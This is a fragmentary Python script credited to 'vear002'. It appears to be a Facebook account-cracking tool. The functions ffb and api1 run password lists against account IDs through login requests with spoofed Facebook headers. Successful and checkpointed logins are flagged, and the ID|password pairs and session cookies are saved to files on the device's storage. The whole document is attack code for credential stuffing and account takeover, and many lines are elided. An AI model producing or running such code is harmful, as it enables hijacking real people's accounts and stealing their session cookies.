...
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mvear002\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:vear002
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mvear002\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'x-fb-request-id': 'AFq-mnP7CVp1pnP4xSfT5lU',
    'x-fb-trace-id': 'BMmeeHt4SX3',
    'x-fb-rev': '1008024322',
    'x-fb-debug': 'WRTmZcUjlzq+0N7zoLoBwxy/5mSZUWHQlhNgB7qVeGIUPOpj0oyqyowwHa/CpF4def93ApiCT3DtxzH03rFHAw==',
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [vear002-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [vear002-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                             ...
                             'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [vear002-OK] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [vear002] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/vear002CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [vear002-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/vear002-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/vear002_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [vear002-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/vear002-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
